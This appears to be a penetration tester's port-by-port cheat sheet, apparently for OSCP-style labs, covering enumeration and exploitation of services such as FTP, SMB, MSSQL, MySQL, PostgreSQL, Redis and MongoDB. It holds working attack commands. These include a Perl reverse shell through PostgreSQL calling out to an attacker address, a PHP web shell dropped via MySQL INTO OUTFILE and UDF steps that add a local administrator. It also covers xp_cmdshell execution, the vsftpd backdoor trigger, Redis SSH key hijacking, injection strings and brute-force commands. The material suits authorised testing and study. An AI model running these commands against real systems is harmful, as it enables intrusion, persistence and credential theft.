## SERVICE ENUMERATION

### METHODOLOGY

```bash
#tcp() + udp() scan functions on the target( IP + any hostnames) -> Inspect one service at a time
#scan functions [port] [IP] --> name + version/banner for vulnerabilities
#Vuln search -> cve.mitre.org + sploitus + vulners + ssp + ExploitDB -> ssp --nmap [xml_output]
#Inspect the protocol of services with telnet/netcat + wireshark
#Bruteforce every authentication supporting services (*)
#Do not develop tunnel vision, connect everything, find the most probable path to RCE
#If you don't find any valuable connection, reset everything and start from the beginning

#Suspicious media files -> Steganography -> exiftool, strings, xxd, steghide, binwalk
#					       Reference: https://0xffsec.com/handbook/steganography/
#Data dumps + Backups + Sensitive files -> Hacktricks forensic analysis
```

### WIRESHARK / TCPDUMP

```bash
#PCAP Analysis Tool
https://github.com/lgandx/PCredz

#Use for inspecting traffic on the network
sudo wireshark
[capture with filter "net [NETWORK/CIDR]"]
[follow -> streams of interesting packets]

#Essential Wireshark filters (can use 'or', 'and', 'not', 'contains' between filters -> make complex expressions! )
[tcp/udp].[dst]port == [port]
ip.[src/dst] == [ip]
ip.addr == [ip]
tcp.flags.[ack/syn] == [1/0]

http.request
http.request.method == "[method]"
http.host contains "[portion_name]"
icmp
arp

#PCAP Analysis
wireshark -> open PCAP file
```

### 21 - FTP *

```bash
#Anonymous login, file read/write privilege, listing/navigation, quick RCE, set permissions
sudo ftp -p [IP] [PORT] + anonymous:pass
get/put [file]
ls, cd, pwd
system whoami; ()
chmod 777 shells.php

#Recursive wget
wget --mirror 'ftp://[USER]:[PASS]@10.10.10.59'

#Config file + common root paths
/etc/vsftpd.conf (proftpd.conf, ftp.conf, ftpusers)

C:\xampp\Filezilla FTP
C:\inetpub\ftproot
/var/ftp
/srv/ftp

#passive / binary / ascii mode (list / get-put binaries/texts)
passive
binary
ascii

#vsftpd 2.3.4 root exploit
telnet [IP] 21
USER pwn:)
PASS [anything]
telnet [IP] 6200

#Pachev FTP - Traversal
ssp -m 47956

#Home FTP Server 1.10.2.143 - Traversal
ssp -m 30450

#ProFTP 1.3.5 - RCE / File read
ssp -m 36803
cpfr [path/to/file]
cpto /tmp/output_file
```

### 22 - SSH *

```bash
#Generate Key pair
ssh-keygen -t rsa -N '' -b 4096
#Insert id_rsa.pub in server's authorized_keys -> use your private id_rsa to login as the user

#Config file
sshd_config

#Interesting flags
-o "StrictHostKeyChecking=no"
-o "UserKnownHostsFile=/dev/null"

#Proper SSH permissions
600 -> Private key
0700 -> .ssh folder
0644 -> authorized_keys file
400 -> Public key authentication

#Bypass SFTP restricted access
ssh [user]@[IP] /bin/bash

#Known exploits
OpenSSH SCP Client   Write Arbitrary Files  ssp -m 46516       
OpenSSH 2.3 < 7.7    Username Enumeration   ssp -m 45233
OpenSSH < 6.6 SFTP   Command Execution		ssp -m 45001
Sysax 5.53           SSH ‘Username’ R-BOF	ssp -m 18557
libssh > 0.6         Authentication Bypass	ssp -m 46307
Paramiko < 2.4.1	 Command Execution	    ssp -m 35712 (CVE-2018-7750 github)

#Check Debian OpenSSL Predictable PRNG

#Attacking public keys to recover private keys
RsaCtfTool.py --publickey key.pub --private

#Bruteforce -> Are there any lockout measures? Weak credentials?
hydra -t 10 -V -I -l [USER] -P '/usr/share/john/rockyou.txt' -e nsr -f ssh://[IP]:[PORT]
```

### 23 - TELNET *

```bash
#Connection + Banner
nc -vnC [IP] 23
telnet [IP] 23

#Scanning
nmap -n -sV -Pn --script "*telnet* and safe" -p 23 [IP]

#Bruteforce
hydra -e nsr -f -V -t 10 -l user -P /usr/share/john/rockyou.txt [IP] telnet
```

### 25 / 465 / 587 - SMTP

```bash
#Figure out MX Servers from domain
nslookup -> set type=MX -> [domain]

#User bruteforcing
smtp-user-enum -M [METHOD] -U users.txt -t [IP]

#NTLM-SSP Message Disclosure
telnet [IP] 25 -> AUTH NTLM 334 -> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
sudo nmap -sCV --script="smtp-ntlm-info" -p25 [IP]

#Send a e-mail (Tool / Manual)
sendemail -t 'TO_ADDRESS' -f 'FROM_ADDRESS' -a 'ATTACHMENT' -s '[MAIL:SERVER]' -u '[SUBJECT]' -m '[MESSAGE]'

telnet [IP] 25
EHLO [host]
MAIL FROM:<[Mail_here]>
RCPT TO:<[Mail_to]>
DATA
#OPTIONAL
#-----------#
From:<[Mail_here]>
To:<[Mail_to]>
Subject: Test
#------------#
[MESSAGE_HERE]
.
QUIT

#Encrypted connection (port 587)
openssl s_client -starttls smtp -connect [SERVER]:587

#Open a SMTP server
sudo python -m smtpd -n -c DebuggingServer [YOUR_IP]:25
```

### 43 - WHOIS

```bash
#Banner + WHOIS query
nc -vn [IP] 43
whois -h [IP] -p 43 "[address_to_query]"

#SQL Injection
whois -h [IP] -p 43 "a') or 1=1#

#RWHOIS runs on port 4321 -> Fail2ban + RWHOIS service = possible RCE with tilde escape 
echo "~| [CMD]" | nc -lvnp 4321

#You have to create a RWHOIS entry for your address in the database and trigger a SSH lockout
```

### 53 - DNS

```bash
#Config files
host.conf
resolv.conf
named.conf

#Useful records
ANY, A, MX, PTR, TXT, CNAME, NS

#Banner grab
dig version.bind CHAOS TXT @[IP]

#Records and reverse lookup
dig -t [record] [DOM] @[DNS_SERVER]

nslookup -> server [DNS] -> [IP]
dig -x [IP] @[DNS]
dig -t PTR [IP].in-addr.arpa @[DNS]
nslookup -type=ptr [IP]
host [IP]

#Reverse lookup bruteforcing
for ip in $(seq 0 255); do host [IP_FIRST_THREE].$ip; done | grep -v "not found"

#DNS domains bruting
gobuster dns -d [domain] -r [IP] -w dns_list.txt

#CVE-2020-1350 - Windows DNS Service BoF
```

### 69 - TFTP *

```bash
#Connection
tftp
connect [IP]

#Check directory traversal, check upload files
get ../../../../[file]
put [file]

#Buffer Overflow AT-TFTP 1.9
ssp -m 2854

#Distinct TFTP 3.10 RCE
exploit/windows/tftp/distinct_tftp_traversal

#TFTP Server 1.4 ST Overflow
exploit/windows/tftp/tftpserver_wrq_bof
```

### 79 - FINGER

```bash
#Banner grab
nc -vn [IP] 79

#See logged users
finger @[IP]

#Command injection
finger "|uname -a@[IP]"

#0 / Alphabet attack
finger 0@[IP]
finger "a b c d e f g h"@[IP]

#Finger bouncing
finger [USER]@[IP_1]@[IP_2]

#Find a specific user
finger -l [user]@[IP]

#Enumerate a user
finger -s [USER]@[IP]
```

### 87 - NOSTROMO

```bash
#Check banner and version
#Nostromo 1.9.6 RCE
ssp -m 47837

#Nostromo nhttpd 1.9.3 RCE
ssp -m 35466
```

### 110 - POP3 *

```bash
#Authentication and Bruteforce
nc -vnC [IP] [PORT] + USER/PASS authentication
hydra -L user.txt -P pass.txt -f [IP] pop3 -V

#Status + Read messages
STAT

LIST
RETR [id of message]
```

### 113 - IDENT

```bash
#Enumerates users owning a service on a port
ident-user-enum [IP] [PORT]
```

### 123 - NTP

```bash
#Standard Enumeration
nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 [IP]
```

### 111 / 135 / 593 - MS-RPC *

```bash
#Enumeration
rpcmap.py 'ncacn_ip_tcp:[IP]'

#Obtain RPC endpoints info (look for NFS, rusersd, ypbind -> Hacktricks after that)
rpcinfo [IP]
rpcbind -p [IP]

#Connection to the MSRPC
rpcclient -U "" -N [IP]
rpcclient -U [HOSTNAME/USER] [IP]

#Enumeration commands
rpcclient> srvinfo
rpcclient> enumdomains
rpcclient> querydominfo
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> getdompwinfo
rpcclient> enumprinters
rpcclient> netshareenumall

# Follow up enumeration
rpcclient> querygroup 0x200
rpcclient> querygroupmem 0x200
rpcclient> queryuser 0x3601
rpcclient> getusrdompwinfo 0x3601

#Check PrinterNightmare
impacket-rpcdump IP | egrep 'MS-RPRN|MS-PAR'
```

### 137 / 138 / 139 - NetBIOS

```bash
#Enumeration
nbtscan -vh [IP]

#You can discover hostnames, MAC address, workgroups
nmblookup -A [IP]
sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n [IP]

#You can resolve IP's to NETBIOS names
nbtscan -r [IP/CIDR]
```

### 139 / 445 - SMB *

```bash
#Config files
/export/samba/secure/smbpasswd.bak
/etc/samba/smb.conf

#2.2.x version = trans2open overflow
ssp -m 7

#SMBCry, EternalBlue

#Mount share
sudo mount -t cifs -o rw,user=guest,password=[pass/empty] '//[IP]/[share]' /mnt/[share]

#Enumeration (guest / anonymous / authenticated) -> -R option for recursive listing
smbmap -H [IP] -u invalid
smbmap -H [IP]
smbmap -H [IP] -u [user] -p [pass]

smbclient -L [IP] -U "invalid" --option='client min protocol=NT1'
smbclient -L [IP] -U "" --option='client min protocol=NT1'
smbclient //[IP]/[SHARE] -U "[USER]%[PASS]"

#enum4linux, permissions, old version
enum4linux -U -G -r [IP]
smbcalcs --no-pass //[IP]/[Share] Accounts
ngrep -i -d tun0 's.?a.?m.?b.?a.*[[:digit:]]' + NT1 option smbclient

#Recursive download
mask ""
recurse ON
prompt OFF
mget *

#Bruteforce
hydra -L users.txt -P passwords.txt smb://[IP]

#If the password is expired, use it to reset the password
smbpasswd -U [user] -r [IP]

#in the AD enviroment you can use ntlm-info
ntlm-info smb [IP]
```

### 143 / 993 - IMAP *

```bash
#Enumeration
sudo nmap -sC -sV --script=imap-ntlm-info -p 143 [IP]

#Access to service (NoSSL / SSL)
nc -vn [IP] 143
openssl s_client -connect [IP]:993 -quiet

#Authentication
A1 LOGIN [user] [pass]

#List Folders/Mailboxes
A1 LIST "" *

#Select a mailbox
A1 SELECT [INBOX]

#List messages
A1 FETCH 1:* (FLAGS)
A1 UID FETCH 1:* (FLAGS)

#Retrieve Message Content
A1 FETCH 2 body[text]
A1 FETCH 2 all
A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])
```

### 161 - SNMP

```bash
#Enumerate with public string (windows/linux/cisco)
snmpenum [IP] public /usr/share/snmpenum/windows.txt
snmp-check [IP]
snmpwalk -v2c -c public -On [IP] > SNMP_DUMP.txt

#Check internal services, processes, users, binaries, extra web applications, endpoints -> vulnerabilities

#Query a particular MIB (hrSWRunParameters?)
snmpwalk -v2c -c public [IP] [MIB]

#If 'public' isn't allowed, try 'manager' or 'private' and then -> bruteforce strings
onesixtyone -c com_strings.txt [IP]
```

### 500 - ISAKMP *

```bash
#Enumeration
ike-scan -M [IP] # <-- Auth field (PSK) + accepted handshakes (ipsec possible?)
ikeforce.py
ike-version.nse

#/etc/ipsec.secrets
[YOUR_IP] [VICTIM_IP] %any ; PSK "[PSK_PASS_HERE]"

#/etc/ipsec.conf
conn my_conn
        authby=secret
        auto=route
        keyexchange=ikev1
        ike=3des-sha1-modp1024
        left=[YOUR_IP]
        right=[VICTIM_IP]
        type=transport
        esp=3des-sha1
        rightprotocol=tcp
    
#Start the connection
ipsec stop && ipsec start
ipsec up my_conn

#Scan using the -sT option in nmap
```

### 512-514 - RSH *

```bash
#Attempt unauth login (root -> any other user)
rsh -l root [IP]
rlogin -l root [IP]
```

### 623 - IPMI

```bash
#Enumeration
nmap -sU --script "ipmi-* and not brute" -p623 [IP]

#Dump hashes - zero attack - username required
auxiliary/scanner/ipmi/ipmi_cipher_zero
```

### 873 - RSYNC *

```bash
#List the Shares + Banner
nc -vn [IP] 873 + #'list' command

#Pull down the shares
rsync -av --list-only rsync://[IP]/[SHARE] ./rsyncfiles

#Upload folders
rsync -a --relative ./.ssh rsync://[IP]/[SHARE]
```

### 2049 - NFS

```bash
#Generic info
rpcinfo [IP]
nmap -sV -p 111 --script=nfs* [IP]

#If mountd is visible (873 / 20048) -> look shares -> no_root_squash?
showmount -e [IP]
[if root shares -> setuid(0) C file in share with u+s perms -> execute from victim session]

#Mount a share
mount -t nfs [IP]:[SHARE] /tmp/nsf_share -o nolock

#Try Read Files (create user pwn:pwn with the corresponding uid)
sudo adduser pwn
sudo sed -i -e 's/[PREV_UID]/[NEW_UID]/g' /etc/passwd
su pwn
```

### 1433 - MSSQL *

```bash
#Connection
mssqlclient.py -db volume -windows-auth <NetBIOS_NAME>/<USERNAME>:<PASSWORD>@<IP>  #Recommended if domain is present
mssqlclient.py -p [PORT] [user]:[pass]@[IP]	#If no domain is present

sqsh -S [IP] -U [USER] -P [PASSWORD]

dbeaver (GUI tool)

#Default credentials
sa:password

#Databases, Tables, Columns
SELECT name FROM master.dbo.sysdatabases;
SELECT * FROM [Database].INFORMATION_SCHEMA.TABLES;
SELECT column_name FROM information_schema.columns WHERE table_name = '[table]';

#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;

#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
sp_addsrvrolemember 'hacker', 'sysadmin'

#NTLM Steal
sudo responder -I <interface>

exec master..xp_dirtree '\\[IP]\Share'
xp_dirtree '\\[IP]\Share'
exec master.dbo.xp_dirtree '\\[IP]\Share'

#Read Files
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("/path/to/file", "r").read())'

#Enabling xp_cmdshell (Auto / Manual) + RCE
enable_xp_cmdshell  # <-- Try to do this from a mssqlclient.py session

EXEC SP_CONFIGURE 'show advanced options',1
reconfigure
go

EXEC SP_CONFIGURE 'xp_cmdshell',1
reconfigure
go

xp_cmdshell 'whoami /all'
go
```

### 1521 - ORACLE TNS *

```bash
#Get SID
sudo odat sidguesser -s [IP] -p [PORT]

#Bruteforce accounts
sudo odat all -s [IP] -p [PORT] -d [SID]

#Enumerate account capabilities
sudo odat all -s [IP] -d [SID] -U [USER] -P [PASS] --sysdba

#RCE (two methods)
sudo odat java -s [ip] -U [USER] -P [PASS] -d [SID] --exec [COMMAND]
sudo odat dbmsscheduler -s [ip] -U [USER] -P [PASS] -d [SID] --exec [COMMAND]

#Read/Write/Execute file
odat utilfile -s [IP] -p [PORT] -U [USER] -P [PASS] -d [SID] --sysdba --getFile C:\\Temp [file] [/path/output]
odat dbmsadvisor -s [IP] -d [SID] -U [USER] -P [PASS] --sysdba --putFile C:\\inetpub\\wwwroot [file] [/path/file]
odat externaltable -s [IP] -p [PORT] -U [USER] -P [PASS] -d [SID] --sysdba --exec C:\\Temp [file]

#Connect with credentials
sqlplus [USER]/[PASS]@[IP]:[PORT]/[SID] as sysdba
```

### 2100 ORACLE XML DB *

```bash
#Connection 
ftp ftp://[USER:PASSWORD@HOST:PORT]

#Default credentials (try variations, uppercase, etc...)
sys:sys
scott:tiger
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
users/pass-oracle.txt -> OSCP/WORDLISTS
```

### 3306 - MYSQL *

```bash
#Grab the banner -> search for vulnerabilities
MariaDB 10.2 -> https://github.com/Al1ex/CVE-2021-27928 #wsrep RCE

#Connect + Command execution (Non-brute/Brute)
mysql -h [IP] --port=3306 -u root -p  #Try default login root:[blank]
mysql -h [IP] -u [user] -p [password]
mysql -h [IP] -u [user] -p [password] -e '\! /bin/sh'

mysqldump --databases [database] -u [user] -p [password]  # <-- If mysql is not present

#Info Gathering
select database();
select version();
show variables;
show grants;
select user,password from user;

#Privileges
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user='[you]';

create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

#Config files
/etc/mysql/mariadb.conf.d/50-server.cnf
/etc/mysql/my.cnf
/etc/my.cnf  # <-- Try to change user=root in here

#Database + Tables
show databases;
use <database>;

show tables;
describe <table_name>;

#Read, Write
select load_file('[FILE/PATH]');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Files with credentials
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
cat /etc/mysql/debian.cnf

#--------------------------------UDF - RCE (Linux)------------------------------#
#Check insecure file handling, privileges and plugin_dir first
SHOW VARIABLES LIKE "secure_file_priv";
show grants;
show variables like 'plugin_dir';

#Compile the raptor_udf library (FUNC_NAME = 'do_system')
wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

#Create table and execute do_system calls
create table hack(line blob);
insert into hack values(load_file('/tmp/raptor_udf2.so'));
select * from hack into dumpfile '/usr/lib/raptor_udf2.so';   #Try /usr/lib/mysql/plugin if plugin_dir is empty
create function FUNC_NAME returns integer soname 'raptor_udf2.so';
select FUNC_NAME('COMMAND_HERE');
#-----------------------------------------------------------------------#

#For Windows you have to manually download the sys.dll file

#Check architecture and download the right library
https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql

#Add local admin "dirac:password" via UDF
USE mysql; CREATE TABLE mytbl(line blob); INSERT INTO mytbl values(load_file('[writable/path/]/lib_mysqludf_sys.dll')); SELECT * FROM mysql.mytbl INTO DUMPFILE 'c:/windows/system32/lib_mysqludf_sys_32.dll'; CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll'; SELECT sys_exec("net user dirac password /add"); SELECT sys_exec("net localgroup Administrators dirac /add"); 
```

### 5432 - PSQL *

```bash
#Connection
psql -h [IP] -U postgres (pass: postgres)

#Databases / Tables / User roles / Hashes
\list
\c [database]

\d

\du+
SELECT current_setting('is_superuser');
SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name='[TABLE]'

SELECT usename, passwd from pg_shadow;

#Change password
ALTER USER [user] WITH PASSWORD 'new_password';

#Config files
postgresql.conf
pg_hba.conf
pgadmin4.db # <-- https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py

#pgadmin enumeration after decryption
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db

#File system enum
select pg_ls_dir('[file_or_dir]');

#Read File
create table demo(t text);
copy demo from '/etc/passwd';
select * from demo;

#Write to file
COPY (select convert_from(decode('[B64_DATA]','base64'),'utf-8')) to '[path/here]'; 

#Command Execution
create table cmd_exec(cmd_output text);
copy cmd_exec from program 'whoami';
select * from cmd_exec;

#Reverse shell one-liner
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.49.101:10000");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

### 3000 - NODE.JS EXPRESS

```bash
#Try to reach the graphql database
http://[IP]:3000/graphql?query={user{username}} #(or /__graphql/, /api/users)

#GraphQL injections
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection

#Search for NoSQL injection opportunities (MongoDB is often used)
#Search for controller JS files in the source
```

### 3690 - SVN

```bash
#Banner
nc -vn 10.10.10.10 3690

#Listing / Commits / Download the repo / Go to revision "n"
svn ls svn://[IP]
svn log svn://[IP]
svn checkout svn://[IP] # <-- You can also do "svn cp"
svn up -r [n]

#Config directory
C:/svnrepos/www/conf/
```

### 3128 - SQUID PROXY

```bash
#If no authentication is in place
echo 'http [TARGET_IP] 3128' >> /etc/proxychains.conf

#You can enumerate internal services from the outside
proxychains nmap -n -sT --top-ports 2000 127.0.0.1 
```

### 3389 - RDP / ThinVNC *

```bash
#Scanning
nmap -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020 [IP]
ssp -m 47519 # <-- Auth bypass of ThinVNC

#Check credentials
rdp_check.py <domain>/<user>:<password>@<IP>

#Login
rdesktop -u guest $ip -g 94%
xfreerdp /d:[DOMAIN] /p:'[PASS]' /u:[USER] /v:[IP] +clipboard [/dynamic-resolution /drive:[KALI_FOLDER_TO_SHARE],share]

#Pass the Hash
xfreerdp /d:[DOMAIN] /u:[USER] /pth:[HASH] /v:192.168.122.143

#Bruteforcing
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```

### 5900 - VNC *

```bash
#Scanning
nmap -sV -Pn -p 5900 --script=*vnc* [IP]

#Brute
hydra -s 5900 -P pass.txt -t 30 [IP] vnc

#Connecting
vncviewer [-passwd passwd.txt] [IP]:[PORT]

#Auth bypass check + exploit
https://github.com/curesec/tools/blob/master/vnc/vnc-authentication-bypass.py
https://github.com/arm13/exploits-1/blob/master/vncpwn.py
use auxiliary/admin/vnc/realvnc_41_bypass

#Decrypting
https://github.com/jeroennijhof/vncpwd
vncpwd [/.vnc/passwd file]
```

### 6379 - REDIS *

```bash
#Connection + Enumeration
nmap --script redis-info -sV -p 6379 [IP]
redis-cli -h [IP] -a '[password]'
AUTH [USER] [PASS]

#Configuration files + current path
/etc/redis/redis.conf
/etc/systemd/system/redis.service
config get dir

#Webshell RCE
config set dir [path]
config set dbfilename [filename]
set test "[PHP SHELL]"
save

#SSH Hijacking (if a ssh key path is writable)
(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key

config set dir [SSH path]
config set dbfilename "authorized_keys"
save

ssh -i id_rsa redis@[IP]

#Module RCE (clone https://github.com/vulhub/redis-rogue-getshell and 'make' the SDK)
MODULE LOAD /path/to/exp.so
system.exec "id"
```

### 11211 - MEMCACHED

```bash
#Check stats, items, and objects inside
memcstat --servers=[IP] #Get stats
memcdump --servers=[IP] #Get all items
memccat  --servers=[IP] <item1> <item2> <item3> #Get info inside the items

#You can set keys inside the cache (see flask deserialization example)
```

### 194 / 6667, 7000 - IRC

```bash
#Enumeration
nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 [IP]

#UnrealIRCd 3.2.8 Backdoor
https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py

#Connection using netcat
nc -vn [IP] [PORT]
NICK dirac
USER dirac 8 * dirac

#Connection using irssi
irssi -c [IP] -p [port] -n dirac

!irc> /version
!irc> /list               # list channels + channel banner
!irc> /join [channel]
!irc> /admin              # admin info
!irc> /oper [user] [pass] # login as operator (privileged user)
!irc> /whois [user]       # user info

!channel> /names          # list users inside each channel
!channel> /leave          # leave channel
!channel> privmsg [user]  # Send message to user
```

### 27017 - MONGO *

```bash
#References
https://www.netscylla.com/blog/2018/09/13/hacking-mongodb.html

#Config file
mongodb.conf
grep "noauth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#"

#Enumeration
nmap -sV --script "mongo* and default" -p 27017 [IP]

#MongoDB 2.2.3 = RCE
ssp -m 24947

#Connection
mongo [HOST]:[PORT]
mongo [HOST]:[PORT] -u [user] -p '[pass]'

#Databases
show dbs
use [database]

#Tables and columns
show collections
db.[collection].find()

#Insert data
db.[collection].insert( { cmd: "bash /tmp/shell.sh" } );

#Find key:value pair in database
db.current.find({"username":"admin"})
```







